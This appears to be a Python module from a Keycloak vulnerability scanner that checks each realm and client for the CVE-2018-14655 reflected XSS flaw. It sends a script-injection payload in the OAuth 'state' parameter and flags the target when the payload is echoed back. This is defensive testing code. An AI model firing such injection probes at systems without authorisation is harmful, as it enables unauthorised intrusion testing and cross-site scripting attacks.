from typing import Dict

from keycloak_scanner.logging.vuln_flag import VulnFlag
from keycloak_scanner.scanners.clients_scanner import Clients
from keycloak_scanner.scanners.realm_scanner import Realms, Realm
from keycloak_scanner.scanners.scanner import Scanner
from keycloak_scanner.scanners.scanner_pieces import Need3
from keycloak_scanner.scanners.well_known_scanner import WellKnownDict


class FormPostXssResult:

    def __init__(self, realm: Realm, is_vulnerable: bool):
        self.realm = realm
        self.is_vulnerable = is_vulnerable

    def __repr__(self):
        return f'FormPostXssResult({repr(self.realm)}, {self.is_vulnerable})'

    def __eq__(self, other):
        if isinstance(other, FormPostXssResult):
            return self.realm == other.realm and self.is_vulnerable == other.is_vulnerable
        return NotImplemented


class FormPostXssResults(Dict[str, FormPostXssResult]):
    pass


class FormPostXssScanner(Need3[Realms, Clients, WellKnownDict], Scanner[FormPostXssResults]):

    def __init__(self, **kwars):
        super().__init__(**kwars)

    def perform(self, realms: Realms, clients: Clients, well_known_dict: WellKnownDict, **kwargs) -> (FormPostXssResults, VulnFlag):

        results = FormPostXssResults()

        vf = VulnFlag()

        for realm in realms:

            well_known = well_known_dict[realm.name]

            vulnerable = False

            if 'form_post' not in well_known.json['response_modes_supported']:
                super().verbose(f'post_form not in supported response types, can\' test CVE-2018-14655 for realm {realm}')

            else:
                url = well_known.json['authorization_endpoint']

                for client in clients:

                    payload = 'af0ifjsldkj"/><script type="text/javascript">alert(1)</script> <p class="'
                    r = super().session().get(url, params={
                            'state': payload,
                            'response_type': 'token',
                            'response_mode': 'form_post',
                            'client_id': client,
                            'nonce': 'csa3hMlvybERqcieLH'
                         })

                    if r.status_code == 200:
                        if payload in r.text:
                            super().find('XSS-CVE2018-14655', 'Vulnerable to CVE 2018 14655 realm:{}, client:{}'.format(realm, client))
                            vulnerable = True
                            vf.set_vuln()

            results[realm.name] = FormPostXssResult(realm, vulnerable)

        return results, vf
